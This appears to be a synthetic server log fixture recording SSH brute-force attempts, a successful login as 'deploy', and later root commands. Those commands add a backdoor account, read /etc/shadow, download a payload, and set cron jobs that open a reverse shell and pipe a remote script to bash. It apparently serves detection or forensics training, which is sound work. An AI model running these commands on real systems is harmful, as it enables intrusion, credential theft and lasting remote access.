+Feb 17 06:25:39 prod-web-01 sshd[23345]: Failed password for invalid user www-data from 192.0.2.100 port 51347 ssh2
+Feb 17 06:25:41 prod-web-01 sshd[23385]: Failed password for deploy from 192.0.2.100 port 56766 ssh2
+Feb 17 06:25:41 prod-web-01 sshd[23351]: Failed password for invalid user postgres from 192.0.2.100 port 55556 ssh2
+Feb 17 06:25:41 prod-web-01 sshd[23385]: Connection closed by 192.0.2.100 port 45807 [preauth]
+Feb 17 06:25:44 prod-web-01 sshd[23334]: Failed password for ubuntu from 192.0.2.100 port 56829 ssh2
+Feb 17 06:25:44 prod-web-01 sshd[23332]: Failed password for invalid user mysql from 192.0.2.100 port 59767 ssh2
+Feb 17 06:25:51 prod-web-01 sshd[23333]: Failed password for invalid user www-data from 192.0.2.100 port 61247 ssh2
+Feb 17 06:25:52 prod-web-01 sshd[23352]: Failed password for invalid user postgres from 192.0.2.100 port 47878 ssh2
+Feb 17 06:25:58 prod-web-01 sshd[23388]: Failed password for invalid user test from 192.0.2.100 port 45469 ssh2
+Feb 17 06:25:58 prod-web-01 sshd[23388]: Connection closed by 192.0.2.100 port 64359 [preauth]
+Feb 17 06:26:00 prod-web-01 sshd[23408]: Failed password for invalid user postgres from 192.0.2.100 port 42691 ssh2
+Feb 17 06:26:00 prod-web-01 sshd[23341]: Failed password for invalid user postgres from 192.0.2.100 port 51088 ssh2
+Feb 17 06:26:01 prod-web-01 sshd[23366]: Failed password for invalid user backup from 192.0.2.100 port 60181 ssh2
+Feb 17 06:26:02 prod-web-01 sshd[23353]: Failed password for invalid user postgres from 192.0.2.100 port 46884 ssh2
+Feb 17 06:26:03 prod-web-01 sshd[23353]: Connection closed by 192.0.2.100 port 60203 [preauth]
+Feb 17 06:26:08 prod-web-01 sshd[23355]: Failed password for deploy from 192.0.2.100 port 40912 ssh2
+Feb 17 06:26:11 prod-web-01 sshd[23369]: Failed password for invalid user backup from 192.0.2.100 port 57504 ssh2
+Feb 17 06:26:12 prod-web-01 sshd[23369]: Connection closed by 192.0.2.100 port 44103 [preauth]
+Feb 17 06:26:20 prod-web-01 sshd[23389]: Failed password for ubuntu from 192.0.2.100 port 53133 ssh2
+Feb 17 06:26:21 prod-web-01 sshd[23389]: Connection closed by 192.0.2.100 port 50624 [preauth]
+Feb 17 06:26:23 prod-web-01 sshd[23390]: Failed password for invalid user oracle from 192.0.2.100 port 54453 ssh2
+Feb 17 06:26:43 prod-web-01 sshd[23374]: Failed password for invalid user admin from 192.0.2.100 port 49746 ssh2
+Feb 17 06:26:52 prod-web-01 sshd[23411]: Failed password for invalid user backup from 192.0.2.100 port 49732 ssh2
+Feb 17 06:26:53 prod-web-01 sshd[23411]: Connection closed by 192.0.2.100 port 54230 [preauth]
+Feb 17 06:26:55 prod-web-01 sshd[23395]: Failed password for invalid user mysql from 192.0.2.100 port 52409 ssh2
+Feb 17 06:26:57 prod-web-01 sshd[23403]: Failed password for root from 192.0.2.100 port 49388 ssh2
+Feb 17 06:26:57 prod-web-01 sshd[23403]: Connection closed by 192.0.2.100 port 41814 [preauth]
+Feb 17 06:27:02 prod-web-01 sshd[23382]: Failed password for ubuntu from 192.0.2.100 port 61941 ssh2
+Feb 17 06:27:08 prod-web-01 sshd[23371]: Failed password for invalid user www-data from 192.0.2.100 port 58023 ssh2
+Feb 17 06:27:08 prod-web-01 sshd[23371]: Connection closed by 192.0.2.100 port 47525 [preauth]
+Feb 17 06:27:09 prod-web-01 sshd[23414]: Failed password for invalid user mysql from 192.0.2.100 port 54878 ssh2
+Feb 17 06:27:11 prod-web-01 sshd[23396]: Failed password for invalid user postgres from 192.0.2.100 port 64982 ssh2
+Feb 17 06:27:25 prod-web-01 sshd[23398]: Failed password for invalid user test from 192.0.2.100 port 59362 ssh2
+Feb 17 06:27:27 prod-web-01 sshd[23368]: Failed password for invalid user admin from 192.0.2.100 port 63888 ssh2
+Feb 17 06:27:27 prod-web-01 sshd[23368]: Connection closed by 192.0.2.100 port 61495 [preauth]
+Feb 17 06:27:33 prod-web-01 sshd[23393]: Failed password for invalid user postgres from 192.0.2.100 port 45993 ssh2
+Feb 17 06:27:34 prod-web-01 sshd[23412]: Failed password for invalid user postgres from 192.0.2.100 port 41002 ssh2
+Feb 17 06:27:38 prod-web-01 sshd[23373]: Failed password for deploy from 192.0.2.100 port 41032 ssh2
+Feb 17 06:27:44 prod-web-01 sshd[23404]: Failed password for invalid user admin from 192.0.2.100 port 54749 ssh2
+Feb 17 06:27:44 prod-web-01 sshd[23379]: Failed password for invalid user test from 192.0.2.100 port 59968 ssh2
+Feb 17 06:27:46 prod-web-01 sshd[23392]: Failed password for root from 192.0.2.100 port 41888 ssh2
+Feb 17 06:27:47 prod-web-01 sshd[23392]: Connection closed by 192.0.2.100 port 61795 [preauth]
+Feb 17 06:27:47 prod-web-01 sshd[23400]: Failed password for ubuntu from 192.0.2.100 port 57951 ssh2
+Feb 17 06:27:54 prod-web-01 sshd[23384]: Failed password for root from 192.0.2.100 port 60528 ssh2
+Feb 17 06:27:56 prod-web-01 sshd[23416]: Accepted password for deploy from 192.0.2.100 port 55805 ssh2
+Feb 17 06:27:57 prod-web-01 sshd[23416]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Feb 17 06:28:11 prod-web-01 sshd[23401]: Failed password for invalid user backup from 192.0.2.100 port 47486 ssh2
+Feb 17 06:28:30 prod-web-01 sshd[23410]: Failed password for invalid user oracle from 192.0.2.100 port 60893 ssh2
+Feb 17 06:28:32 prod-web-01 sshd[23391]: Failed password for deploy from 192.0.2.100 port 62500 ssh2
+Feb 17 06:28:38 prod-web-01 sshd[23394]: Failed password for deploy from 192.0.2.100 port 43839 ssh2
+Feb 17 06:28:51 prod-web-01 sshd[23405]: Failed password for invalid user oracle from 192.0.2.100 port 43462 ssh2
+Feb 17 06:28:51 prod-web-01 sshd[23405]: Connection closed by 192.0.2.100 port 64366 [preauth]
+Feb 17 06:28:57 prod-web-01 sshd[23409]: Failed password for invalid user test from 192.0.2.100 port 62371 ssh2
+Feb 17 06:28:58 prod-web-01 sshd[23409]: Connection closed by 192.0.2.100 port 47946 [preauth]
+Feb 17 06:29:12 prod-web-01 sshd[23406]: Failed password for invalid user oracle from 192.0.2.100 port 61444 ssh2
+Feb 17 06:29:44 prod-web-01 sshd[23413]: Failed password for invalid user postgres from 192.0.2.100 port 47424 ssh2
+Feb 17 06:45:00 prod-web-01 sshd[37514]: Failed password for invalid user oracle from 203.0.113.45 port 62893 ssh2
+Feb 17 06:45:00 prod-web-01 sshd[37515]: Failed password for ubuntu from 203.0.113.45 port 43332 ssh2
+Feb 17 06:45:02 prod-web-01 sshd[37516]: Failed password for invalid user mysql from 203.0.113.45 port 42699 ssh2
+Feb 17 06:45:04 prod-web-01 sshd[37517]: Failed password for invalid user oracle from 203.0.113.45 port 49208 ssh2
+Feb 17 06:45:05 prod-web-01 sshd[37520]: Failed password for root from 203.0.113.45 port 45584 ssh2
+Feb 17 06:45:05 prod-web-01 sshd[37520]: Connection closed by 203.0.113.45 port 46531 [preauth]
+Feb 17 06:45:07 prod-web-01 sshd[37525]: Failed password for invalid user test from 203.0.113.45 port 63450 ssh2
+Feb 17 06:45:09 prod-web-01 sshd[37524]: Failed password for invalid user admin from 203.0.113.45 port 48307 ssh2
+Feb 17 06:45:11 prod-web-01 sshd[37518]: Failed password for invalid user backup from 203.0.113.45 port 60715 ssh2
+Feb 17 06:45:11 prod-web-01 sshd[37522]: Failed password for deploy from 203.0.113.45 port 55723 ssh2
+Feb 17 06:45:13 prod-web-01 sshd[37526]: Failed password for deploy from 203.0.113.45 port 62238 ssh2
+Feb 17 06:45:13 prod-web-01 sshd[37519]: Failed password for invalid user oracle from 203.0.113.45 port 48480 ssh2
+Feb 17 06:45:13 prod-web-01 sshd[37521]: Failed password for invalid user postgres from 203.0.113.45 port 55036 ssh2
+Feb 17 06:45:17 prod-web-01 sshd[37543]: Failed password for invalid user test from 203.0.113.45 port 60433 ssh2
+Feb 17 06:45:17 prod-web-01 sshd[37543]: Connection closed by 203.0.113.45 port 56844 [preauth]
+Feb 17 06:45:18 prod-web-01 sshd[37532]: Failed password for deploy from 203.0.113.45 port 63914 ssh2
+Feb 17 06:45:18 prod-web-01 sshd[37539]: Failed password for root from 203.0.113.45 port 60947 ssh2
+Feb 17 06:45:20 prod-web-01 sshd[37544]: Failed password for invalid user postgres from 203.0.113.45 port 40090 ssh2
+Feb 17 06:45:22 prod-web-01 sshd[37555]: Failed password for invalid user postgres from 203.0.113.45 port 44583 ssh2
+Feb 17 06:45:22 prod-web-01 sshd[37555]: Connection closed by 203.0.113.45 port 50906 [preauth]
+Feb 17 06:45:23 prod-web-01 sshd[37523]: Failed password for root from 203.0.113.45 port 45856 ssh2
+Feb 17 06:45:25 prod-web-01 sshd[37535]: Failed password for invalid user test from 203.0.113.45 port 41533 ssh2
+Feb 17 06:45:26 prod-web-01 sshd[37527]: Failed password for deploy from 203.0.113.45 port 62738 ssh2
+Feb 17 06:45:26 prod-web-01 sshd[37548]: Failed password for invalid user mysql from 203.0.113.45 port 57161 ssh2
+Feb 17 06:45:27 prod-web-01 sshd[37550]: Failed password for invalid user admin from 203.0.113.45 port 64258 ssh2
+Feb 17 06:45:27 prod-web-01 sshd[37528]: Failed password for invalid user test from 203.0.113.45 port 57192 ssh2
+Feb 17 06:45:31 prod-web-01 sshd[37542]: Failed password for root from 203.0.113.45 port 63542 ssh2
+Feb 17 06:45:33 prod-web-01 sshd[37530]: Failed password for deploy from 203.0.113.45 port 50061 ssh2
+Feb 17 06:45:38 prod-web-01 sshd[37529]: Failed password for invalid user test from 203.0.113.45 port 59647 ssh2
+Feb 17 06:45:39 prod-web-01 sshd[37531]: Failed password for invalid user mysql from 203.0.113.45 port 42102 ssh2
+Feb 17 06:45:40 prod-web-01 sshd[37556]: Failed password for root from 203.0.113.45 port 45936 ssh2
+Feb 17 06:45:40 prod-web-01 sshd[37556]: Connection closed by 203.0.113.45 port 52419 [preauth]
+Feb 17 06:45:41 prod-web-01 sshd[37533]: Failed password for deploy from 203.0.113.45 port 48409 ssh2
+Feb 17 06:45:43 prod-web-01 sshd[37558]: Failed password for invalid user admin from 203.0.113.45 port 60254 ssh2
+Feb 17 06:45:44 prod-web-01 sshd[37567]: Failed password for invalid user www-data from 203.0.113.45 port 48375 ssh2
+Feb 17 06:45:46 prod-web-01 sshd[37577]: Failed password for invalid user www-data from 203.0.113.45 port 50543 ssh2
+Feb 17 06:45:46 prod-web-01 sshd[37540]: Failed password for root from 203.0.113.45 port 62010 ssh2
+Feb 17 06:45:46 prod-web-01 sshd[37540]: Connection closed by 203.0.113.45 port 48389 [preauth]
+Feb 17 06:45:49 prod-web-01 sshd[37569]: Failed password for invalid user backup from 203.0.113.45 port 60607 ssh2
+Feb 17 06:45:50 prod-web-01 sshd[37569]: Connection closed by 203.0.113.45 port 56311 [preauth]
+Feb 17 06:45:50 prod-web-01 sshd[37534]: Failed password for invalid user backup from 203.0.113.45 port 55651 ssh2
+Feb 17 06:45:53 prod-web-01 sshd[37537]: Failed password for root from 203.0.113.45 port 50525 ssh2
+Feb 17 06:45:58 prod-web-01 sshd[37564]: Failed password for invalid user www-data from 203.0.113.45 port 48393 ssh2
+Feb 17 06:45:58 prod-web-01 sshd[37564]: Connection closed by 203.0.113.45 port 64025 [preauth]
+Feb 17 06:45:58 prod-web-01 sshd[37585]: Failed password for invalid user test from 203.0.113.45 port 44463 ssh2
+Feb 17 06:45:58 prod-web-01 sshd[37538]: Failed password for invalid user test from 203.0.113.45 port 49400 ssh2
+Feb 17 06:46:00 prod-web-01 sshd[37570]: Failed password for invalid user postgres from 203.0.113.45 port 61069 ssh2
+Feb 17 06:46:01 prod-web-01 sshd[37570]: Connection closed by 203.0.113.45 port 48548 [preauth]
+Feb 17 06:46:02 prod-web-01 sshd[37560]: Failed password for invalid user backup from 203.0.113.45 port 56210 ssh2
+Feb 17 06:46:03 prod-web-01 sshd[37536]: Failed password for invalid user postgres from 203.0.113.45 port 44593 ssh2
+Feb 17 06:46:04 prod-web-01 sshd[37586]: Failed password for ubuntu from 203.0.113.45 port 54854 ssh2
+Feb 17 06:46:04 prod-web-01 sshd[37587]: Failed password for invalid user test from 203.0.113.45 port 47342 ssh2
+Feb 17 06:46:05 prod-web-01 sshd[37586]: Connection closed by 203.0.113.45 port 50893 [preauth]
+Feb 17 06:46:06 prod-web-01 sshd[37541]: Failed password for invalid user backup from 203.0.113.45 port 56980 ssh2
+Feb 17 06:46:07 prod-web-01 sshd[37541]: Connection closed by 203.0.113.45 port 55213 [preauth]
+Feb 17 06:46:09 prod-web-01 sshd[37554]: Failed password for invalid user test from 203.0.113.45 port 53325 ssh2
+Feb 17 06:46:10 prod-web-01 sshd[37575]: Failed password for invalid user www-data from 203.0.113.45 port 43080 ssh2
+Feb 17 06:46:11 prod-web-01 sshd[37575]: Connection closed by 203.0.113.45 port 47198 [preauth]
+Feb 17 06:46:13 prod-web-01 sshd[37568]: Failed password for invalid user admin from 203.0.113.45 port 62739 ssh2
+Feb 17 06:46:14 prod-web-01 sshd[37576]: Failed password for deploy from 203.0.113.45 port 40596 ssh2
+Feb 17 06:46:15 prod-web-01 sshd[37552]: Failed password for invalid user test from 203.0.113.45 port 57102 ssh2
+Feb 17 06:46:15 prod-web-01 sshd[37546]: Failed password for invalid user postgres from 203.0.113.45 port 42855 ssh2
+Feb 17 06:46:15 prod-web-01 sshd[37552]: Connection closed by 203.0.113.45 port 47941 [preauth]
+Feb 17 06:46:17 prod-web-01 sshd[37545]: Failed password for invalid user postgres from 203.0.113.45 port 57110 ssh2
+Feb 17 06:46:18 prod-web-01 sshd[37545]: Connection closed by 203.0.113.45 port 47498 [preauth]
+Feb 17 06:46:20 prod-web-01 sshd[37557]: Failed password for invalid user www-data from 203.0.113.45 port 48254 ssh2
+Feb 17 06:46:21 prod-web-01 sshd[37579]: Failed password for invalid user test from 203.0.113.45 port 44253 ssh2
+Feb 17 06:46:21 prod-web-01 sshd[37557]: Connection closed by 203.0.113.45 port 48075 [preauth]
+Feb 17 06:46:21 prod-web-01 sshd[37579]: Connection closed by 203.0.113.45 port 61453 [preauth]
+Feb 17 06:46:22 prod-web-01 sshd[37573]: Failed password for invalid user oracle from 203.0.113.45 port 52663 ssh2
+Feb 17 06:46:23 prod-web-01 sshd[37573]: Connection closed by 203.0.113.45 port 62619 [preauth]
+Feb 17 06:46:24 prod-web-01 sshd[37559]: Failed password for invalid user admin from 203.0.113.45 port 41830 ssh2
+Feb 17 06:46:25 prod-web-01 sshd[37553]: Failed password for root from 203.0.113.45 port 60322 ssh2
+Feb 17 06:46:27 prod-web-01 sshd[37582]: Failed password for root from 203.0.113.45 port 43192 ssh2
+Feb 17 06:46:28 prod-web-01 sshd[37580]: Failed password for invalid user admin from 203.0.113.45 port 62309 ssh2
+Feb 17 06:46:29 prod-web-01 sshd[37580]: Connection closed by 203.0.113.45 port 56769 [preauth]
+Feb 17 06:46:29 prod-web-01 sshd[37551]: Failed password for invalid user admin from 203.0.113.45 port 59814 ssh2
+Feb 17 06:46:29 prod-web-01 sshd[37547]: Failed password for ubuntu from 203.0.113.45 port 53379 ssh2
+Feb 17 06:46:32 prod-web-01 sshd[37584]: Failed password for ubuntu from 203.0.113.45 port 40108 ssh2
+Feb 17 06:46:32 prod-web-01 sshd[37584]: Connection closed by 203.0.113.45 port 62873 [preauth]
+Feb 17 06:46:37 prod-web-01 sshd[37574]: Failed password for invalid user test from 203.0.113.45 port 48239 ssh2
+Feb 17 06:46:37 prod-web-01 sshd[37574]: Connection closed by 203.0.113.45 port 43633 [preauth]
+Feb 17 06:46:39 prod-web-01 sshd[37572]: Failed password for invalid user www-data from 203.0.113.45 port 56718 ssh2
+Feb 17 06:46:39 prod-web-01 sshd[37549]: Failed password for root from 203.0.113.45 port 47860 ssh2
+Feb 17 06:46:44 prod-web-01 sshd[37571]: Failed password for invalid user test from 203.0.113.45 port 63367 ssh2
+Feb 17 06:46:52 prod-web-01 sshd[37578]: Failed password for invalid user backup from 203.0.113.45 port 60059 ssh2
+Feb 17 06:47:01 prod-web-01 sshd[37565]: Failed password for invalid user www-data from 203.0.113.45 port 59921 ssh2
+Feb 17 06:47:04 prod-web-01 sshd[37561]: Failed password for invalid user postgres from 203.0.113.45 port 48688 ssh2
+Feb 17 06:47:11 prod-web-01 sshd[37563]: Failed password for ubuntu from 203.0.113.45 port 47497 ssh2
+Feb 17 06:47:17 prod-web-01 sshd[37562]: Failed password for deploy from 203.0.113.45 port 48776 ssh2
+Feb 17 06:47:22 prod-web-01 sshd[37589]: Failed password for invalid user oracle from 203.0.113.45 port 48064 ssh2
+Feb 17 06:47:25 prod-web-01 sshd[37566]: Failed password for ubuntu from 203.0.113.45 port 63409 ssh2
+Feb 17 06:47:32 prod-web-01 sshd[37581]: Failed password for invalid user admin from 203.0.113.45 port 48709 ssh2
+Feb 17 06:47:37 prod-web-01 sshd[37588]: Failed password for invalid user backup from 203.0.113.45 port 54556 ssh2
+Feb 17 06:47:38 prod-web-01 sshd[37588]: Connection closed by 203.0.113.45 port 56876 [preauth]
+Feb 17 06:47:39 prod-web-01 sshd[37591]: Failed password for invalid user www-data from 203.0.113.45 port 52647 ssh2
+Feb 17 06:47:40 prod-web-01 sshd[37591]: Connection closed by 203.0.113.45 port 63393 [preauth]
+Feb 17 06:47:44 prod-web-01 sshd[37593]: Accepted password for deploy from 203.0.113.45 port 56467 ssh2
+Feb 17 06:47:45 prod-web-01 sshd[37593]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Feb 17 06:48:09 prod-web-01 sshd[37583]: Failed password for invalid user admin from 203.0.113.45 port 49251 ssh2
+Feb 17 06:48:10 prod-web-01 sshd[37583]: Connection closed by 203.0.113.45 port 52095 [preauth]
+Feb 17 06:48:28 prod-web-01 sshd[37590]: Failed password for invalid user mysql from 203.0.113.45 port 56653 ssh2
+Feb 17 06:48:29 prod-web-01 sshd[37590]: Connection closed by 203.0.113.45 port 57498 [preauth]
+Feb 17 07:25:00 prod-web-01 sshd[17853]: Accepted password for ubuntu from 10.0.2.10 port 41873 ssh2
+Feb 17 07:25:01 prod-web-01 sshd[17853]: pam_unix(sshd:session): session opened for user ubuntu(uid=1001) by (uid=0)
+Feb 17 08:54:00 prod-web-01 sshd[29413]: Accepted password for ubuntu from 10.0.1.51 port 54582 ssh2
+Feb 17 08:54:01 prod-web-01 sshd[29413]: pam_unix(sshd:session): session opened for user ubuntu(uid=1001) by (uid=0)
+Feb 17 10:48:00 prod-web-01 sshd[28721]: Accepted password for deploy from 172.16.0.5 port 54518 ssh2
+Feb 17 10:48:01 prod-web-01 sshd[28721]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Feb 17 12:34:00 prod-web-01 sshd[16005]: Accepted password for ubuntu from 10.0.2.10 port 57041 ssh2
+Feb 17 12:34:01 prod-web-01 sshd[16005]: pam_unix(sshd:session): session opened for user ubuntu(uid=1001) by (uid=0)
+Feb 17 13:47:00 prod-web-01 sshd[26416]: Accepted password for ubuntu from 10.0.1.50 port 48862 ssh2
+Feb 17 13:47:01 prod-web-01 sshd[26416]: pam_unix(sshd:session): session opened for user ubuntu(uid=1001) by (uid=0)
+Feb 17 14:06:00 prod-web-01 sshd[10378]: Accepted password for deploy from 10.0.1.51 port 55161 ssh2
+Feb 17 14:06:01 prod-web-01 sshd[10378]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Feb 17 15:07:00 prod-web-01 sshd[27225]: Accepted password for deploy from 10.0.2.10 port 57612 ssh2
+Feb 17 15:07:01 prod-web-01 sshd[27225]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Feb 17 15:14:00 prod-web-01 sshd[13676]: Accepted password for ubuntu from 10.0.2.10 port 59119 ssh2
+Feb 17 15:14:01 prod-web-01 sshd[13676]: pam_unix(sshd:session): session opened for user ubuntu(uid=1001) by (uid=0)
+Feb 17 16:22:00 prod-web-01 sshd[11247]: Accepted password for ubuntu from 10.0.1.51 port 59905 ssh2
+Feb 17 16:22:01 prod-web-01 sshd[11247]: pam_unix(sshd:session): session opened for user ubuntu(uid=1001) by (uid=0)
+Feb 17 20:24:00 prod-web-01 sshd[22663]: Accepted password for ubuntu from 172.16.0.5 port 57313 ssh2
+Feb 17 20:24:01 prod-web-01 sshd[22663]: pam_unix(sshd:session): session opened for user ubuntu(uid=1001) by (uid=0)
+Feb 17 21:20:00 prod-web-01 sshd[16885]: Accepted password for ubuntu from 10.0.1.51 port 50571 ssh2
+Feb 17 21:20:01 prod-web-01 sshd[16885]: pam_unix(sshd:session): session opened for user ubuntu(uid=1001) by (uid=0)
+Feb 17 23:21:00 prod-web-01 sshd[27783]: Accepted password for deploy from 10.0.2.10 port 59465 ssh2
+Feb 17 23:21:00 prod-web-01 sshd[13420]: Accepted password for deploy from 10.0.1.51 port 51812 ssh2
+Feb 17 23:21:01 prod-web-01 sshd[27783]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Feb 17 23:21:01 prod-web-01 sshd[13420]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Feb 17 23:39:00 prod-web-01 sshd[10693]: Accepted password for ubuntu from 172.16.0.5 port 54457 ssh2
+Feb 17 23:39:01 prod-web-01 sshd[10693]: pam_unix(sshd:session): session opened for user ubuntu(uid=1001) by (uid=0)
+Feb 17 01:39:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt update
+Feb 17 02:00:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Feb 17 02:41:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Feb 17 04:11:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Feb 17 05:44:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+Feb 17 05:56:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status sshd
+Feb 17 06:45:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+Feb 17 08:00:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+Feb 17 08:02:00 prod-web-01 sudo: www-data : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/bin/bash
+Feb 17 08:02:30 prod-web-01 su: FAILED su for root by www-data
+Feb 17 08:03:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/sh
+Feb 17 08:06:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd backdoor -m -s /bin/bash
+Feb 17 08:08:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/passwd root
+Feb 17 08:14:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.23/payload.sh -O /tmp/payload.sh
+Feb 17 08:18:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/chmod 4755 /tmp/shell
+Feb 17 08:18:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/find / -perm -4000 -type f 2>/dev/null
+Feb 17 08:20:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo backdoor
+Feb 17 08:20:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Feb 17 08:40:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
+Feb 17 09:04:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Feb 17 10:30:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+Feb 17 11:26:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+Feb 17 01:00:00 prod-web-01 CRON[23719]: (deploy CMD (/opt/app/scripts/backup.sh))
+Feb 17 04:00:00 prod-web-01 CRON[27969]: (root CMD (/usr/bin/certbot renew --quiet))
+Feb 17 11:00:00 prod-web-01 CRON[25128]: (root CMD (/usr/bin/certbot renew --quiet))
+Feb 17 11:00:00 prod-web-01 crontab[34640]: (deploy) REPLACE (deploy)
+Feb 17 11:00:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tee /etc/systemd/system/system-update.service
+Feb 17 11:00:01 prod-web-01 CRON[36428]: (deploy) CMD (* * * * * /bin/bash -c 'bash -i >& /dev/tcp/198.51.100.23/4444 0>&1')
+Feb 17 11:00:05 prod-web-01 systemd[1]: Created slice system-update.service.
+Feb 17 11:00:06 prod-web-01 systemd[1]: Starting System Update Service...
+Feb 17 11:00:07 prod-web-01 systemd[1]: Started System Update Service.
+Feb 17 11:00:10 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl enable system-update.service
+Feb 17 11:00:12 prod-web-01 systemd[1]: Reloading daemon configuration.
+Feb 17 11:00:15 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl start system-update.service
+Feb 17 11:03:00 prod-web-01 crontab[22331]: (deploy) REPLACE (deploy)
+Feb 17 11:03:01 prod-web-01 CRON[29721]: (deploy) CMD (*/5 * * * * /tmp/.hidden/beacon.sh)
+Feb 17 11:06:00 prod-web-01 crontab[23784]: (root) REPLACE (root)
+Feb 17 11:06:01 prod-web-01 CRON[37704]: (root) CMD (0 */2 * * * curl -s http://198.51.100.23/update.sh | bash)
+Feb 17 13:00:00 prod-web-01 CRON[11243]: (root CMD (/usr/lib/apt/apt.systemd.daily))
+Feb 17 18:00:00 prod-web-01 CRON[24678]: (root CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )))
+Feb 17 20:00:00 prod-web-01 CRON[28352]: (root CMD (/usr/bin/certbot renew --quiet))
+Feb 17 23:00:00 prod-web-01 CRON[25135]: (root CMD (/usr/bin/certbot renew --quiet))
+Feb 18 05:00:00 prod-web-01 CRON[17641]: (deploy CMD (/opt/app/scripts/backup.sh))
+Feb 18 07:00:00 prod-web-01 CRON[25742]: (root CMD (/usr/bin/certbot renew --quiet))
+Feb 18 13:00:00 prod-web-01 CRON[22227]: (root CMD (/usr/bin/certbot renew --quiet))
+Feb 18 18:00:00 prod-web-01 CRON[13580]: (root CMD (/usr/lib/apt/apt.systemd.daily))
+Feb 18 21:00:00 prod-web-01 CRON[25312]: (root CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )))
